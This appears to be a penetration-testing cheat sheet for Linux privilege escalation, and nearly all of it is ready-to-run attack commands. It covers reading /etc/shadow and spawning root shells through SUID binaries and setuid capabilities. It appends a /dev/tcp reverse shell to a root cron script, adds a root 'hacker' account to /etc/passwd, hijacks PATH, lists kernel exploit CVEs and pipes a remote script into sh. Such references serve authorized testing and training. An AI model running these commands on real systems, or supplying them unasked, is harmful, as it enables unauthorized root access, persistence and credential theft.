# FLLC Linux Privilege Escalation Cheatsheet

## Initial Enumeration

```bash
# Current user context
id
whoami
groups
sudo -l
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow 2>/dev/null

# System info
uname -a
cat /etc/os-release
hostname
```

## SUID/SGID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Check GTFOBins for exploitation:
# https://gtfobins.github.io/

# Common exploitable SUID:
# /usr/bin/python3    → python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
# /usr/bin/find       → find . -exec /bin/sh -p \;
# /usr/bin/vim        → vim -c ':!sh'
# /usr/bin/nmap       → nmap --interactive → !sh
# /usr/bin/env        → env /bin/sh -p
```

## Cron Jobs

```bash
# System crontab
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null

# Look for writable scripts executed by root
# If /opt/backup.sh runs as root and is world-writable:
echo '/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /opt/backup.sh
```

## Capabilities

```bash
getcap -r / 2>/dev/null

# python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

## Writable Files

```bash
find / -writable -type f 2>/dev/null | grep -v proc
find /etc -writable -type f 2>/dev/null

# Writable /etc/passwd:
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# Writable /etc/shadow:
# Replace root hash with known password hash
```

## Kernel Exploits

```bash
uname -r
# Search: searchsploit linux kernel <version>
# Common: DirtyCow (CVE-2016-5195), PwnKit (CVE-2021-4034)
# DirtyPipe (CVE-2022-0847), GameOver(lay) (CVE-2023-2640)
```

## Path Hijacking

```bash
# If a script runs a command without full path:
echo '/bin/bash -p' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
# Now run the vulnerable script
```

## Automated Tools

```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

---

*FLLC 2026*
